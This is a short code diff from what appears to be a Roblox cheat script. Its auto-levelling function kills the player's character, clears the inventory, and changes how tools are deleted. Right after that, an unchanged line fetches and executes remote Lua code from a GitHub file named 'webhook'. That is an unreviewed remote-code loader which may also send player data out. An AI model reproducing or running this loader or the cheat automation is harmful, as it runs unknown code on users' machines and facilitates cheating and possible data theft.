@@ -597,7 +597,11 @@ function autoLv()
                             wait(0.1)
                         until game.Players.LocalPlayer.Character.Humanoid.Health == 0
                         game.Players.LocalPlayer.Backpack:ClearAllChildren()
-                        workspace.CharacterHolder.gfiraht:ClearAllChildren()
+			for _, obj in pairs(workspace.CharacterHolder.gfirhat:GetChildren()) do 
+                            if obj.ClassName == "Tool" then
+			        obj:Destroy()
+		            end
+			end
                         loadstring(game:HttpGet("https://raw.githubusercontent.com/dorgaes/yea/main/webhook"))()
 	            end
 		end
